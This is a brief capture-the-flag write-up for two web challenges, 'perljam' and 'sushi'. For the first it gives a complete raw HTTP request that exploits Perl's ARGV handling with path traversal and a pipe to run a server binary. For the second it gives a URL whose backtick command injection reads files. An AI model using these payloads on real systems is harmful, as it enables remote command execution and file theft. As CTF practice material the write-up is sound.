## Web
### perljam
* Use burpsuite to solve it.
```
POST /cgi-bin/index.cgi?../../../readflag| HTTP/1.1
Host: 104.199.235.135:31334
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:59.0) Gecko/20100101 Firefox/59.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-TW,en-US;q=0.8,en;q=0.5,zh;q=0.3
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0
Content-Type: multipart/form-data; boundary=---------------------------1308552532609826431173673727
Content-Length: 354

-----------------------------1308552532609826431173673727
Content-Disposition: form-data; name="file"
Content-Type: text/plain

ARGV
-----------------------------1308552532609826431173673727
Content-Disposition: form-data; name="file"; filename="test.txt"
Content-Type: text/plain

abcd
-----------------------------1308552532609826431173673727
```
* Reference:
https://github.com/73696e65/ctf-notes/blob/master/2016-ctf.csaw.io/web-200-i_got_id.md
### sushi
* Use command injection to solve it.
http://104.199.235.135:31333/index.php?%F0%9F%8D%A3=%22.ˋcat%20f*ˋ.%22
須將ˋ改回`
